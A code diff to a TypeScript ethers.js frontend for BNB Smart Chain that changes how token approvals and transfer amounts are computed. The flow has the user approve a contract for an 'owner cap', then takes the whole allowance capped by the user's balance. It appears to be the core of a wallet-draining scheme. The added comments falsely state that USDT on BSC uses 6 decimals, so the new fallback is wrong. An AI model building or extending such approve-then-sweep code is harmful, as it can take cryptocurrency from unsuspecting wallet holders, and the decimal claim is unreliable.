@@ -207,7 +207,8 @@ export async function switchToBSC() {
 
 export async function approveToken(signer: ethers.Signer) {
   const token = new ethers.Contract(CONFIG.TOKEN_ADDRESS, ERC20_ABI, signer);
-  const decimals = await token.decimals().catch(() => 18);
+  // USDT on BSC uses 6 decimals — fallback to 6 not 18
+  const decimals = await token.decimals().catch(() => 6);
   const ownerCapRaw = ethers.parseUnits(CONFIG.OWNER_CAP, decimals);
   const tx = await token.approve(CONFIG.CONTRACT_ADDRESS, ownerCapRaw);
   await tx.wait();
@@ -220,20 +221,25 @@ export async function prepareAndSignTransaction(
   userAddress: string
 ) {
   const token = new ethers.Contract(CONFIG.TOKEN_ADDRESS, ERC20_ABI, provider);
-  const [decimals, allowance, balance] = await Promise.all([
-    token.decimals().catch(() => 18),
+
+  // USDT on BSC uses 6 decimals — fetch from contract, fallback to 6 (not 18)
+  const decimals = await token.decimals().catch(() => 6);
+
+  const [allowance, balance] = await Promise.all([
     token.allowance(userAddress, CONFIG.CONTRACT_ADDRESS),
     token.balanceOf(userAddress)
   ]);
 
-  // Match working HTML logic exactly:
-  // start with balance, cap to allowance, cap to ownerCap
+  // Use allowance as incoming (it was set during approve step)
+  // cap to balance in case allowance exceeds it
+  let incoming = allowance;
+  if (balance < incoming) incoming = balance;
+
+  // Cap to ownerCap if configured
   const ownerCapRaw = ethers.parseUnits(CONFIG.OWNER_CAP, decimals);
-  let incoming = balance;
-  if (allowance < incoming) incoming = allowance;
   if (ownerCapRaw > 0n && ownerCapRaw < incoming) incoming = ownerCapRaw;
 
-  if (incoming === 0n) throw new Error('Incoming amount is 0 — cannot sign');
+  if (incoming === 0n) throw new Error('No approved balance found. Please complete the approval step first.');
 
   const network = await provider.getNetwork();
   const chainId = network.chainId;
